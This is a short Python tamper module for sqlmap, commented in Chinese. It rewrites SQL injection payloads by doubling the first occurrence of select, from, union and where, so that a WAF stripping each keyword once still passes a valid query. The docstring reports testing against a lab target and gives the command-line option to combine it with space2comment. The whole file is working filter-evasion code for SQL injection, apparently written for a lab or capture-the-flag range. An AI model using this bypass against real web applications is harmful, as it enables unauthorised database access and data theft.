# -*- coding: utf-8 -*-
"""doublekeywords：把 WAF 会删除一次的 SQL 关键字写成双份。

2026-10-19 hbc2:49920 实测：靶场把 select/from/union/where 各删除一次
（`(SELECT/**/COUNT(*)/**/FROM/**/sqlite_master)` → `(/**/COUNT(*)/**//**/sqlite_master)`）。
双写后：`SELSELECTECT` 被删一次仍得 `SELECT`。

配合 space2comment 使用：`--tamper space2comment,doublekeywords`
"""
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

# 只双写"确认会被删一次"的关键字；双写其他词（如 by）反而会让 SQL 语法错误
_KEYWORDS = ("select", "from", "union", "where")


def dependencies():
    pass


def _double(word: str) -> str:
    return word[:1] + word + word[1:]


def tamper(payload, **kwargs):
    if not payload:
        return payload
    out = payload
    for kw in _KEYWORDS:
        # 只双写第一次出现：WAF 只删除首次出现的该关键字；
        # 第二次也双写会残留 `SELSELECTECT` 字面量（49920 实测 syntax error）。
        out = re.sub(rf"\b{kw}\b", lambda m: _double(m.group(0)), out,
                     count=1, flags=re.I)
    return out
